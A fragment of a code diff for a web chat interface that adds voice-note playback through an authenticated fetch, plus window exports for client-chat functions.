+                        'Authorization': `Bearer ${state.token}`
+                    }
+                });
+                
+                if (response.ok) {
+                    const blob = await response.blob();
+                    const audioUrl = URL.createObjectURL(blob);
+                    const audioPlayer = document.getElementById('audioPlayer');
+                    audioPlayer.src = audioUrl;
+                    audioPlayer.play();
+                }
+            } catch (error) {
+                console.error('Play voice note error:', error);
+            }
+        }
+
         // ========== GLOBAL EXPORTS ==========
         window.handleLogin = handleLogin;
         window.handleLogout = handleLogout;
@@ -5215,6 +5611,10 @@ if __name__ == "__main__":
         window.scrollToBottom = scrollToBottom;
         window.loadMoreMessages = loadMoreMessages;
         window.playVoiceNote = playVoiceNote;
+        window.openClientChat = openClientChat;
+        window.closeClientChat = closeClientChat;
+        window.updateClientChatCommand = updateClientChatCommand;
+        window.sendToClient = sendToClient;
     </script>
 </body>
 </html>
